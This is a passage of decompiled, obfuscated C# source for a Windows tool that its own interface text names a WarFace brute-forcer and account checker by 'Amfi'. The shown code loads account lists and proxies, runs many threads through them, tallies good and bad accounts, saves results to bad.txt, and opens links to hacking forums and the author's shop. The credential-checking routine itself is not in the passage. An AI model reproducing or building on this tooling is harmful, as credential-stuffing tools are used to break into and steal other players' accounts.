							YYMDSDATHSFUURYHIGBFLB.JGEHMNSBTPIBDJFFBAMWCE("bad.txt", ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP[dtfdfznlbhqyjldhusduhp.RJORVGJCHKPFJBKUOZRTTG].ToString());
							ZUKPFWCFAUTRSGGDNAPJX.XSHFVURTLDLISMXGOXSAV++;
							a = "GOOD PROXY";
						}
						else
						{
							ZUKPFWCFAUTRSGGDNAPJX.HSPPCYJLGFFTNBSVSDITH++;
							ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.Add(ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP[dtfdfznlbhqyjldhusduhp.RJORVGJCHKPFJBKUOZRTTG].ToString());
							a = "NONE";
						}
					}
					Thread.Sleep(10);
					this.LRUFEGXEZGTMFHDBLLOGRY(array[0] + ":" + array[1], cpjkhppqzlusqtibnzdnft, text);
					Thread.Sleep(30);
				}
				if (ZUKPFWCFAUTRSGGDNAPJX.VXMIRKXANSWHDLPJSWFFK + ZUKPFWCFAUTRSGGDNAPJX.XSHFVURTLDLISMXGOXSAV == ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.Count)
				{
					this.TIHBDJEPAJWRACMPPHLNXT();
				}
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00004AF4 File Offset: 0x00002CF4
		private void TIHBDJEPAJWRACMPPHLNXT()
		{
			this.ZUPHFYDOEHZKLFRJXCETEJ.Enabled = false;
			this.TZCDBZWQPEWXSAMIGQJDQH.Enabled = false;
			this.DQTKZKBMXOLUEIXXGMHUSU.Enabled = false;
			this.EXPFAFSZHYJZJBVNTLEGMT.Enabled = false;
			this.JWTWZZOMTPYTKGIRGHHPTY.Enabled = false;
			this.BBJDDERACAYCCLSKVCCBLU.Enabled = false;
			this.PPTVGXKHNWJMHSBSRQXRHL.Enabled = true;
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00004B58 File Offset: 0x00002D58
		private void GRJDDVQSDMCJIQWIBQGDLA()
		{
			this.ZUPHFYDOEHZKLFRJXCETEJ.Enabled = true;
			this.TZCDBZWQPEWXSAMIGQJDQH.Enabled = true;
			this.DQTKZKBMXOLUEIXXGMHUSU.Enabled = false;
			this.EXPFAFSZHYJZJBVNTLEGMT.Enabled = true;
			this.JWTWZZOMTPYTKGIRGHHPTY.Enabled = true;
			this.PPTVGXKHNWJMHSBSRQXRHL.Enabled = false;
			if (this.BBJDDERACAYCCLSKVCCBLU.SelectedIndex != 3)
			{
				this.BBJDDERACAYCCLSKVCCBLU.Enabled = true;
			}
			else
			{
				this.BBJDDERACAYCCLSKVCCBLU.Enabled = false;
			}
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00004BD8 File Offset: 0x00002DD8
		private void LRUFEGXEZGTMFHDBLLOGRY(string ONLLGJNSKIWRVEXKYBLCBC, bool CPJKHPPQZLUSQTIBNZDNFT, string OSDJDUZIPAXEBWTVUMGVOJ)
		{
			lock (this.HFHNPSNWMPYXWBDSPEDMQK)
			{
				this.HOFJDZMQHNLXIEDMCKHUEA.Text = ZUKPFWCFAUTRSGGDNAPJX.VXMIRKXANSWHDLPJSWFFK.ToString();
				this.ISWBNCEQHNFXBIPHUJHUTZ.Text = ZUKPFWCFAUTRSGGDNAPJX.XSHFVURTLDLISMXGOXSAV.ToString();
				this.LFVDVKVCQWLVMBOFNGCOP.Text = ZUKPFWCFAUTRSGGDNAPJX.HSPPCYJLGFFTNBSVSDITH.ToString();
				this.FCEXFLSYDHBAKZZFKIZWB.Value = ZUKPFWCFAUTRSGGDNAPJX.XSHFVURTLDLISMXGOXSAV + ZUKPFWCFAUTRSGGDNAPJX.VXMIRKXANSWHDLPJSWFFK;
			}
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00004C6C File Offset: 0x00002E6C
		private void LJIUYTOBRONHZGCZTYWECZ(object sender, EventArgs e)
		{
			string a = bool.TrueString;
			this.FCEXFLSYDHBAKZZFKIZWB.Value = 0;
			if (this.BBJDDERACAYCCLSKVCCBLU.SelectedIndex == 3)
			{
				ZUKPFWCFAUTRSGGDNAPJX.IZRXIVKWPKCMTYCEAPHLCD = false;
			}
			else
			{
				ZUKPFWCFAUTRSGGDNAPJX.IZRXIVKWPKCMTYCEAPHLCD = true;
			}
			if (ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.Count == 0)
			{
				MessageBox.Show("Вы не загрузили аккаунты !");
				a = "false";
			}
			else if (ZUKPFWCFAUTRSGGDNAPJX.IZRXIVKWPKCMTYCEAPHLCD && ZUKPFWCFAUTRSGGDNAPJX.PNVITANWZWGYNKSSZJUWP.Count == 0)
			{
				MessageBox.Show("Вы не загрузили прокси !");
				a = "false";
			}
			if (a == "True")
			{
				TimeSpan timeOfDay = DateTime.Now.TimeOfDay;
				this.SCEQZFWIWCJGFRQBLZYSIS = DateTime.Now.ToString("HH_mm_ss");
				this.FCEXFLSYDHBAKZZFKIZWB.Maximum = ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.Count;
				MainForm.VQITHZTHDIDSEALGFHUSGQ = (int)this.JWTWZZOMTPYTKGIRGHHPTY.Value * 1000;
				this.CreateThreads();
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00004D6C File Offset: 0x00002F6C
		private void LJRXAUEHSGOYRNQSWKRRAG(object sender, EventArgs e)
		{
			this.StopThreads();
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00004D74 File Offset: 0x00002F74
		private void GUUYITFMVYBSFVORPXBWDS(object sender, EventArgs e)
		{
			try
			{
				ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.Clear();
				ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.AddRange(YYMDSDATHSFUURYHIGBFLB.GOAWITHDICOJFROQFDVSKZ(YYMDSDATHSFUURYHIGBFLB.DLTIRZPFENHSYBSSPWDWGB()));
				this.FYSXZZNUQZAHVGCQIXUPDC.Text = ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.Count.ToString();
			}
			catch
			{
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00004DD4 File Offset: 0x00002FD4
		private void OHYDVZPNBWCJGDMULGXQEM(object sender, EventArgs e)
		{
			try
			{
				ZUKPFWCFAUTRSGGDNAPJX.PNVITANWZWGYNKSSZJUWP.Clear();
				ZUKPFWCFAUTRSGGDNAPJX.PNVITANWZWGYNKSSZJUWP.AddRange(YYMDSDATHSFUURYHIGBFLB.GOAWITHDICOJFROQFDVSKZ(YYMDSDATHSFUURYHIGBFLB.DLTIRZPFENHSYBSSPWDWGB()));
				this.SXFUPRUZDTHEJSUQAYFCCR.Text = ZUKPFWCFAUTRSGGDNAPJX.PNVITANWZWGYNKSSZJUWP.Count.ToString();
			}
			catch
			{
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00004E34 File Offset: 0x00003034
		private void UFFNDFCCBPHAFDGMBHYSCB(object sender, EventArgs e)
		{
			this.GRJDDVQSDMCJIQWIBQGDLA();
			this.HZTGSINNXJRGAFDNRFDBFA.Text = "";
			this.FYSXZZNUQZAHVGCQIXUPDC.Text = "0";
			this.SXFUPRUZDTHEJSUQAYFCCR.Text = "0";
			this.HOFJDZMQHNLXIEDMCKHUEA.Text = "0";
			this.LFVDVKVCQWLVMBOFNGCOP.Text = "0";
			this.ISWBNCEQHNFXBIPHUJHUTZ.Text = "0";
			this.FCEXFLSYDHBAKZZFKIZWB.Value = 0;
			this.PPTVGXKHNWJMHSBSRQXRHL.Enabled = false;
			ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.Clear();
			ZUKPFWCFAUTRSGGDNAPJX.PNVITANWZWGYNKSSZJUWP.Clear();
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00004ED4 File Offset: 0x000030D4
		private void WYYIOARUVNXGBVIXKKQYP(object sender, EventArgs e)
		{
			ZUKPFWCFAUTRSGGDNAPJX.MXXWTDHFGCXOVUKRSOBJNO = this.BBJDDERACAYCCLSKVCCBLU.SelectedIndex;
			if (this.BBJDDERACAYCCLSKVCCBLU.SelectedIndex == 3)
			{
				this.AXVYBLZFVNSUDUHVIKFWEO.Enabled = false;
			}
			else
			{
				this.AXVYBLZFVNSUDUHVIKFWEO.Enabled = true;
			}
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00004F20 File Offset: 0x00003120
		private void GTGIILRWORATPOEJSWQHE(object sender, EventArgs e)
		{
			this.Text = this.Text + "         Пользователь - " + this.UKTIRICDUCEMTCWJRILKGQ;
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00004F40 File Offset: 0x00003140
		private void VJUUOTGHFFMUZJZMTVXNXA(object sender, MouseEventArgs e)
		{
			if (base.WindowState == FormWindowState.Minimized)
			{
				base.WindowState = FormWindowState.Normal;
				base.ShowInTaskbar = true;
				this.ALILMRVYWDOQQUKQBJCGR.Visible = false;
			}
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00004F78 File Offset: 0x00003178
		protected override void OnResize(EventArgs e)
		{
			if (base.WindowState == FormWindowState.Minimized)
			{
				base.ShowInTaskbar = false;
				this.ALILMRVYWDOQQUKQBJCGR.Visible = true;
			}
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00004FA8 File Offset: 0x000031A8
		private void QDWTKUMJUCXSAOBUYDWNT(object sender, FormClosingEventArgs e)
		{
			this.XMIPVHZLLGHBMQQWXKSWMK = false;
			Application.Exit();
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00004FB8 File Offset: 0x000031B8
		private void RZBJUOJRCNELJINNARKM(object sender, EventArgs e)
		{
			Process.Start(Environment.CurrentDirectory);
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00004FC8 File Offset: 0x000031C8
		private void FXGJOCWISGKIOSWTEWXPWU(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Normal;
			base.ShowInTaskbar = true;
			this.ALILMRVYWDOQQUKQBJCGR.Visible = false;
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00004FE4 File Offset: 0x000031E4
		private void XICCWKGOBVLAZHIGDEMOHF(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00004FE8 File Offset: 0x000031E8
		private void NTHVFBNZMWHXBXCLRTHSBQ(object sender, EventArgs e)
		{
			Process.Start("http://youhack.ru");
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00004FF8 File Offset: 0x000031F8
		private void CNVIPJZQWOQUDKYREHXTHR(object sender, EventArgs e)
		{
			Process.Start("http://bhf.su/");
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00005008 File Offset: 0x00003208
		private void XRUBGQCWYEJYRYBCLRWGHP(object sender, EventArgs e)
		{
			Process.Start("http://shop.amfi-network.ru/");
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00005018 File Offset: 0x00003218
		private void FOCLYANRFWPOLJKHPRJFT(object sender, EventArgs e)
		{
			this.ALILMRVYWDOQQUKQBJCGR.BalloonTipIcon = ToolTipIcon.Info;
			this.ALILMRVYWDOQQUKQBJCGR.BalloonTipTitle = "Информация - WarFace - Брутфорс\\Чекер by Amfi";
			this.ALILMRVYWDOQQUKQBJCGR.BalloonTipText = "Автор программы : Amfi \nХочу выразить благодарности таким людям : CodeCracker,avQse,Festar,deival909,AddictiveMan91 - без вас бы ничего не было парни,спасибо за то,что вы есть.\nСпасибо всем тем,кто хейтит меня и мой софт!:)";
			this.ALILMRVYWDOQQUKQBJCGR.ShowBalloonTip(3000);
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00005058 File Offset: 0x00003258
		private void JZLQOIJUQRQHLDPBVHGNOD(object sender, EventArgs e)
		{
			ProxyGrabber proxyGrabber = new ProxyGrabber();
			proxyGrabber.Show();
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000050A4 File Offset: 0x000032A4
		public void InitializeComponent()
		{
			this.MOZABQMOQVTAIXNZAJULQB = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
			this.VKIFNQQNIMENXQLYQCAROW = new Label();
			this.DYGALWJKFWEXKDIHGANSEZ = new Label();
			this.YIZQXBCMVCPJYXTUAUJIL = new Label();
			this.EWLKCQBEBATYSIZZEADBMQ = new Label();
			this.MJPYICJKMTRGRUIHUBIVDD = new Label();
			this.TZCDBZWQPEWXSAMIGQJDQH = new Button();
			this.AXVYBLZFVNSUDUHVIKFWEO = new Button();
			this.PPTVGXKHNWJMHSBSRQXRHL = new Button();
			this.DQTKZKBMXOLUEIXXGMHUSU = new Button();
			this.ZUPHFYDOEHZKLFRJXCETEJ = new Button();
			this.EXPFAFSZHYJZJBVNTLEGMT = new NumericUpDown();
			this.AJQOXTRRQTQXKMEXUBGZTV = new GroupBox();
			this.BBJDDERACAYCCLSKVCCBLU = new ComboBox();
			this.QBWZTDJTVRLWGYSSVCHLTD = new GroupBox();
			this.AKAZHAVILPOIACKWLVTUH = new Button();
			this.JWTWZZOMTPYTKGIRGHHPTY = new NumericUpDown();
			this.TFULHNBPHNVGBILKSUMIMI = new GroupBox();
			this.LFVDVKVCQWLVMBOFNGCOP = new Label();
			this.ISWBNCEQHNFXBIPHUJHUTZ = new Label();
			this.HOFJDZMQHNLXIEDMCKHUEA = new Label();
			this.SXFUPRUZDTHEJSUQAYFCCR = new Label();
			this.FYSXZZNUQZAHVGCQIXUPDC = new Label();
			this.FCEXFLSYDHBAKZZFKIZWB = new ProgressBar();
			this.OJMTRGJJOTCPGRRJAUAWS = new ToolTip(this.MOZABQMOQVTAIXNZAJULQB);
			this.ERXTOLQUJTAWUGWEAEDINT = new ContextMenuStrip(this.MOZABQMOQVTAIXNZAJULQB);
			this.CYBDAQACVYNOZYGLZEUNS = new ToolStripMenuItem();
			this.ZWBPVDOFRIYFRAYVXDTXX = new ToolStripMenuItem();
			this.TDFBZYNAWEVMDDVCMLDKMB = new ToolStripMenuItem();
			this.DRTQBGTIRZWXJLPPHUERKC = new ToolStripMenuItem();
			this.MQIBUMDTVYBZQYGVKBJUXT = new ToolStripMenuItem();
			this.UVVWQANWUOWFCBFTMHEEWJ = new ToolStripMenuItem();
			this.FYQSBXCLTONFCKAYDEHYUQ = new ToolStripMenuItem();
			this.DKCWYGVLHMMRJMCCFIWQKF = new ToolStripMenuItem();
			this.ALILMRVYWDOQQUKQBJCGR = new NotifyIcon(this.MOZABQMOQVTAIXNZAJULQB);
			this.HZTGSINNXJRGAFDNRFDBFA = new TextBox();
			this.ZVFYMASJADMAVJOJSJIHGV = new Button();
			((ISupportInitialize)this.EXPFAFSZHYJZJBVNTLEGMT).BeginInit();
			this.AJQOXTRRQTQXKMEXUBGZTV.SuspendLayout();
			this.QBWZTDJTVRLWGYSSVCHLTD.SuspendLayout();
			((ISupportInitialize)this.JWTWZZOMTPYTKGIRGHHPTY).BeginInit();
			this.TFULHNBPHNVGBILKSUMIMI.SuspendLayout();
			this.ERXTOLQUJTAWUGWEAEDINT.SuspendLayout();
			base.SuspendLayout();
			this.VKIFNQQNIMENXQLYQCAROW.AutoSize = true;
			this.VKIFNQQNIMENXQLYQCAROW.Location = new Point(6, 37);
			this.VKIFNQQNIMENXQLYQCAROW.Name = "lblProxy";
			this.VKIFNQQNIMENXQLYQCAROW.Size = new Size(116, 13);
			this.VKIFNQQNIMENXQLYQCAROW.TabIndex = 4;
			this.VKIFNQQNIMENXQLYQCAROW.Text = "Загружено проксей:";
			this.DYGALWJKFWEXKDIHGANSEZ.AutoSize = true;
			this.DYGALWJKFWEXKDIHGANSEZ.Location = new Point(6, 17);
			this.DYGALWJKFWEXKDIHGANSEZ.Name = "lblSource";
			this.DYGALWJKFWEXKDIHGANSEZ.Size = new Size(125, 13);
			this.DYGALWJKFWEXKDIHGANSEZ.TabIndex = 3;
			this.DYGALWJKFWEXKDIHGANSEZ.Text = "Заргужено аккаунтов:";
			this.YIZQXBCMVCPJYXTUAUJIL.AutoSize = true;
			this.YIZQXBCMVCPJYXTUAUJIL.Location = new Point(6, 97);
			this.YIZQXBCMVCPJYXTUAUJIL.Name = "lblError";
			this.YIZQXBCMVCPJYXTUAUJIL.Size = new Size(55, 13);
			this.YIZQXBCMVCPJYXTUAUJIL.TabIndex = 2;
			this.YIZQXBCMVCPJYXTUAUJIL.Text = "Ошибок:";
			this.EWLKCQBEBATYSIZZEADBMQ.AutoSize = true;
			this.EWLKCQBEBATYSIZZEADBMQ.Location = new Point(6, 77);
			this.EWLKCQBEBATYSIZZEADBMQ.Name = "lblBad";
			this.EWLKCQBEBATYSIZZEADBMQ.Size = new Size(105, 13);
			this.EWLKCQBEBATYSIZZEADBMQ.TabIndex = 1;
			this.EWLKCQBEBATYSIZZEADBMQ.Text = "Плохих аккаунтов:";
			this.MJPYICJKMTRGRUIHUBIVDD.AutoSize = true;
			this.MJPYICJKMTRGRUIHUBIVDD.Location = new Point(6, 57);
			this.MJPYICJKMTRGRUIHUBIVDD.Name = "lblGood";
			this.MJPYICJKMTRGRUIHUBIVDD.Size = new Size(115, 13);
			this.MJPYICJKMTRGRUIHUBIVDD.TabIndex = 0;
			this.MJPYICJKMTRGRUIHUBIVDD.Text = "Хороших аккаунтов:";
			this.TZCDBZWQPEWXSAMIGQJDQH.ForeColor = Color.Black;
			this.TZCDBZWQPEWXSAMIGQJDQH.Location = new Point(7, 16);
			this.TZCDBZWQPEWXSAMIGQJDQH.Name = "btnSource";
			this.TZCDBZWQPEWXSAMIGQJDQH.Size = new Size(192, 26);
			this.TZCDBZWQPEWXSAMIGQJDQH.TabIndex = 4;
			this.TZCDBZWQPEWXSAMIGQJDQH.TabStop = false;
			this.TZCDBZWQPEWXSAMIGQJDQH.Text = "Загрузить базу";
			this.TZCDBZWQPEWXSAMIGQJDQH.Click += this.GUUYITFMVYBSFVORPXBWDS;
			this.AXVYBLZFVNSUDUHVIKFWEO.Enabled = false;
			this.AXVYBLZFVNSUDUHVIKFWEO.ForeColor = Color.Black;
			this.AXVYBLZFVNSUDUHVIKFWEO.Location = new Point(7, 48);
			this.AXVYBLZFVNSUDUHVIKFWEO.Name = "btnProxy";
			this.AXVYBLZFVNSUDUHVIKFWEO.Size = new Size(192, 26);
			this.AXVYBLZFVNSUDUHVIKFWEO.TabIndex = 5;
			this.AXVYBLZFVNSUDUHVIKFWEO.TabStop = false;
			this.AXVYBLZFVNSUDUHVIKFWEO.Text = "Загрузить прокси";
			this.AXVYBLZFVNSUDUHVIKFWEO.Click += this.OHYDVZPNBWCJGDMULGXQEM;
			this.PPTVGXKHNWJMHSBSRQXRHL.Enabled = false;
			this.PPTVGXKHNWJMHSBSRQXRHL.ForeColor = Color.Black;
			this.PPTVGXKHNWJMHSBSRQXRHL.Location = new Point(7, 77);
			this.PPTVGXKHNWJMHSBSRQXRHL.Name = "simpleButton1";
			this.PPTVGXKHNWJMHSBSRQXRHL.Size = new Size(192, 26);
			this.PPTVGXKHNWJMHSBSRQXRHL.TabIndex = 30;
			this.PPTVGXKHNWJMHSBSRQXRHL.TabStop = false;
			this.PPTVGXKHNWJMHSBSRQXRHL.Text = "Сбросить";
			this.PPTVGXKHNWJMHSBSRQXRHL.Click += this.UFFNDFCCBPHAFDGMBHYSCB;
			this.DQTKZKBMXOLUEIXXGMHUSU.Enabled = false;
			this.DQTKZKBMXOLUEIXXGMHUSU.ForeColor = Color.Black;
			this.DQTKZKBMXOLUEIXXGMHUSU.Location = new Point(7, 46);
			this.DQTKZKBMXOLUEIXXGMHUSU.Name = "StopButton";
			this.DQTKZKBMXOLUEIXXGMHUSU.Size = new Size(192, 26);
			this.DQTKZKBMXOLUEIXXGMHUSU.TabIndex = 29;
			this.DQTKZKBMXOLUEIXXGMHUSU.TabStop = false;
			this.DQTKZKBMXOLUEIXXGMHUSU.Text = "Остановить работу";
			this.DQTKZKBMXOLUEIXXGMHUSU.Click += this.LJRXAUEHSGOYRNQSWKRRAG;
			this.ZUPHFYDOEHZKLFRJXCETEJ.ForeColor = Color.Black;
			this.ZUPHFYDOEHZKLFRJXCETEJ.Location = new Point(7, 15);
			this.ZUPHFYDOEHZKLFRJXCETEJ.Name = "StartButton";
			this.ZUPHFYDOEHZKLFRJXCETEJ.Size = new Size(192, 26);
			this.ZUPHFYDOEHZKLFRJXCETEJ.TabIndex = 28;
			this.ZUPHFYDOEHZKLFRJXCETEJ.TabStop = false;
			this.ZUPHFYDOEHZKLFRJXCETEJ.Text = "Начать работу";
			this.ZUPHFYDOEHZKLFRJXCETEJ.Click += this.LJIUYTOBRONHZGCZTYWECZ;
			this.EXPFAFSZHYJZJBVNTLEGMT.Location = new Point(7, 115);
			NumericUpDown expfafszhyjzjbvntlegmt = this.EXPFAFSZHYJZJBVNTLEGMT;
			int[] array = new int[4];
			array[0] = 300;
			expfafszhyjzjbvntlegmt.Maximum = new decimal(array);
			NumericUpDown expfafszhyjzjbvntlegmt2 = this.EXPFAFSZHYJZJBVNTLEGMT;
			array = new int[4];
			array[0] = 1;
			expfafszhyjzjbvntlegmt2.Minimum = new decimal(array);
			this.EXPFAFSZHYJZJBVNTLEGMT.Name = "nThreads";
			this.EXPFAFSZHYJZJBVNTLEGMT.Size = new Size(93, 22);
			this.EXPFAFSZHYJZJBVNTLEGMT.TabIndex = 40;
			this.EXPFAFSZHYJZJBVNTLEGMT.TabStop = false;
			this.EXPFAFSZHYJZJBVNTLEGMT.TextAlign = HorizontalAlignment.Center;
			this.OJMTRGJJOTCPGRRJAUAWS.SetToolTip(this.EXPFAFSZHYJZJBVNTLEGMT, "Количество потоков");
			NumericUpDown expfafszhyjzjbvntlegmt3 = this.EXPFAFSZHYJZJBVNTLEGMT;
			array = new int[4];
			array[0] = 100;
			expfafszhyjzjbvntlegmt3.Value = new decimal(array);
			this.AJQOXTRRQTQXKMEXUBGZTV.Controls.Add(this.ZUPHFYDOEHZKLFRJXCETEJ);
			this.AJQOXTRRQTQXKMEXUBGZTV.Controls.Add(this.DQTKZKBMXOLUEIXXGMHUSU);
			this.AJQOXTRRQTQXKMEXUBGZTV.Controls.Add(this.PPTVGXKHNWJMHSBSRQXRHL);
			this.AJQOXTRRQTQXKMEXUBGZTV.Location = new Point(12, 15);
			this.AJQOXTRRQTQXKMEXUBGZTV.Name = "groupBox1";
			this.AJQOXTRRQTQXKMEXUBGZTV.Size = new Size(206, 113);
			this.AJQOXTRRQTQXKMEXUBGZTV.TabIndex = 39;
			this.AJQOXTRRQTQXKMEXUBGZTV.TabStop = false;
			this.AJQOXTRRQTQXKMEXUBGZTV.Text = "Контроль";
			this.BBJDDERACAYCCLSKVCCBLU.DropDownStyle = ComboBoxStyle.DropDownList;
			this.BBJDDERACAYCCLSKVCCBLU.FormattingEnabled = true;
			this.BBJDDERACAYCCLSKVCCBLU.Items.AddRange(new object[]
			{
				"HTTP(S)",
				"SOCKS4",
				"SOCKS5",
				"NONE"
			});
			this.BBJDDERACAYCCLSKVCCBLU.Location = new Point(7, 143);
			this.BBJDDERACAYCCLSKVCCBLU.Name = "ProxyBox";
			this.BBJDDERACAYCCLSKVCCBLU.Size = new Size(192, 21);
			this.BBJDDERACAYCCLSKVCCBLU.TabIndex = 43;
			this.BBJDDERACAYCCLSKVCCBLU.TabStop = false;
			this.OJMTRGJJOTCPGRRJAUAWS.SetToolTip(this.BBJDDERACAYCCLSKVCCBLU, "Тип прокси");
			this.BBJDDERACAYCCLSKVCCBLU.SelectedIndexChanged += this.WYYIOARUVNXGBVIXKKQYP;
			this.QBWZTDJTVRLWGYSSVCHLTD.Controls.Add(this.ZVFYMASJADMAVJOJSJIHGV);
			this.QBWZTDJTVRLWGYSSVCHLTD.Controls.Add(this.AKAZHAVILPOIACKWLVTUH);
			this.QBWZTDJTVRLWGYSSVCHLTD.Controls.Add(this.JWTWZZOMTPYTKGIRGHHPTY);
			this.QBWZTDJTVRLWGYSSVCHLTD.Controls.Add(this.AXVYBLZFVNSUDUHVIKFWEO);
			this.QBWZTDJTVRLWGYSSVCHLTD.Controls.Add(this.BBJDDERACAYCCLSKVCCBLU);
			this.QBWZTDJTVRLWGYSSVCHLTD.Controls.Add(this.TZCDBZWQPEWXSAMIGQJDQH);
			this.QBWZTDJTVRLWGYSSVCHLTD.Controls.Add(this.EXPFAFSZHYJZJBVNTLEGMT);
			this.QBWZTDJTVRLWGYSSVCHLTD.Location = new Point(12, 134);
			this.QBWZTDJTVRLWGYSSVCHLTD.Name = "groupBox2";
			this.QBWZTDJTVRLWGYSSVCHLTD.Size = new Size(206, 204);
			this.QBWZTDJTVRLWGYSSVCHLTD.TabIndex = 40;
			this.QBWZTDJTVRLWGYSSVCHLTD.TabStop = false;
			this.QBWZTDJTVRLWGYSSVCHLTD.Text = "Загрузка ресурсов";
			this.AKAZHAVILPOIACKWLVTUH.ForeColor = Color.Black;
			this.AKAZHAVILPOIACKWLVTUH.Location = new Point(7, 80);
			this.AKAZHAVILPOIACKWLVTUH.Name = "button1";
			this.AKAZHAVILPOIACKWLVTUH.Size = new Size(192, 26);
			this.AKAZHAVILPOIACKWLVTUH.TabIndex = 46;
			this.AKAZHAVILPOIACKWLVTUH.TabStop = false;
			this.AKAZHAVILPOIACKWLVTUH.Text = "Открыть папку с программой";
			this.AKAZHAVILPOIACKWLVTUH.UseVisualStyleBackColor = true;
			this.AKAZHAVILPOIACKWLVTUH.Click += this.RZBJUOJRCNELJINNARKM;
			this.JWTWZZOMTPYTKGIRGHHPTY.Location = new Point(106, 115);
			NumericUpDown jwtwzzomtpytkgirghhpty = this.JWTWZZOMTPYTKGIRGHHPTY;
			array = new int[4];
			array[0] = 300;
			jwtwzzomtpytkgirghhpty.Maximum = new decimal(array);
			NumericUpDown jwtwzzomtpytkgirghhpty2 = this.JWTWZZOMTPYTKGIRGHHPTY;
			array = new int[4];
			array[0] = 1;
			jwtwzzomtpytkgirghhpty2.Minimum = new decimal(array);
			this.JWTWZZOMTPYTKGIRGHHPTY.Name = "nTimeout";
			this.JWTWZZOMTPYTKGIRGHHPTY.Size = new Size(93, 22);
			this.JWTWZZOMTPYTKGIRGHHPTY.TabIndex = 44;
			this.JWTWZZOMTPYTKGIRGHHPTY.TabStop = false;
			this.JWTWZZOMTPYTKGIRGHHPTY.TextAlign = HorizontalAlignment.Center;
			this.OJMTRGJJOTCPGRRJAUAWS.SetToolTip(this.JWTWZZOMTPYTKGIRGHHPTY, "Количество таймаута");
			NumericUpDown jwtwzzomtpytkgirghhpty3 = this.JWTWZZOMTPYTKGIRGHHPTY;
			array = new int[4];
			array[0] = 15;
			jwtwzzomtpytkgirghhpty3.Value = new decimal(array);
			this.TFULHNBPHNVGBILKSUMIMI.Controls.Add(this.LFVDVKVCQWLVMBOFNGCOP);
			this.TFULHNBPHNVGBILKSUMIMI.Controls.Add(this.ISWBNCEQHNFXBIPHUJHUTZ);
			this.TFULHNBPHNVGBILKSUMIMI.Controls.Add(this.HOFJDZMQHNLXIEDMCKHUEA);
			this.TFULHNBPHNVGBILKSUMIMI.Controls.Add(this.SXFUPRUZDTHEJSUQAYFCCR);
			this.TFULHNBPHNVGBILKSUMIMI.Controls.Add(this.FYSXZZNUQZAHVGCQIXUPDC);
			this.TFULHNBPHNVGBILKSUMIMI.Controls.Add(this.DYGALWJKFWEXKDIHGANSEZ);
			this.TFULHNBPHNVGBILKSUMIMI.Controls.Add(this.YIZQXBCMVCPJYXTUAUJIL);
			this.TFULHNBPHNVGBILKSUMIMI.Controls.Add(this.EWLKCQBEBATYSIZZEADBMQ);
			this.TFULHNBPHNVGBILKSUMIMI.Controls.Add(this.VKIFNQQNIMENXQLYQCAROW);
			this.TFULHNBPHNVGBILKSUMIMI.Controls.Add(this.MJPYICJKMTRGRUIHUBIVDD);
			this.TFULHNBPHNVGBILKSUMIMI.Location = new Point(12, 339);
			this.TFULHNBPHNVGBILKSUMIMI.Name = "groupBox3";
			this.TFULHNBPHNVGBILKSUMIMI.Size = new Size(206, 119);
			this.TFULHNBPHNVGBILKSUMIMI.TabIndex = 43;
			this.TFULHNBPHNVGBILKSUMIMI.TabStop = false;
			this.TFULHNBPHNVGBILKSUMIMI.Text = "Статистика";
			this.LFVDVKVCQWLVMBOFNGCOP.AutoSize = true;
			this.LFVDVKVCQWLVMBOFNGCOP.Location = new Point(137, 97);
			this.LFVDVKVCQWLVMBOFNGCOP.Name = "ErrorLabel";
			this.LFVDVKVCQWLVMBOFNGCOP.Size = new Size(13, 13);
			this.LFVDVKVCQWLVMBOFNGCOP.TabIndex = 9;
			this.LFVDVKVCQWLVMBOFNGCOP.Text = "0";
			this.ISWBNCEQHNFXBIPHUJHUTZ.AutoSize = true;
			this.ISWBNCEQHNFXBIPHUJHUTZ.Location = new Point(137, 77);
			this.ISWBNCEQHNFXBIPHUJHUTZ.Name = "BadLabel";
			this.ISWBNCEQHNFXBIPHUJHUTZ.Size = new Size(13, 13);
			this.ISWBNCEQHNFXBIPHUJHUTZ.TabIndex = 8;
			this.ISWBNCEQHNFXBIPHUJHUTZ.Text = "0";
			this.HOFJDZMQHNLXIEDMCKHUEA.AutoSize = true;
			this.HOFJDZMQHNLXIEDMCKHUEA.Location = new Point(137, 57);
			this.HOFJDZMQHNLXIEDMCKHUEA.Name = "GoodLabel";
			this.HOFJDZMQHNLXIEDMCKHUEA.Size = new Size(13, 13);
			this.HOFJDZMQHNLXIEDMCKHUEA.TabIndex = 7;
			this.HOFJDZMQHNLXIEDMCKHUEA.Text = "0";
			this.SXFUPRUZDTHEJSUQAYFCCR.AutoSize = true;
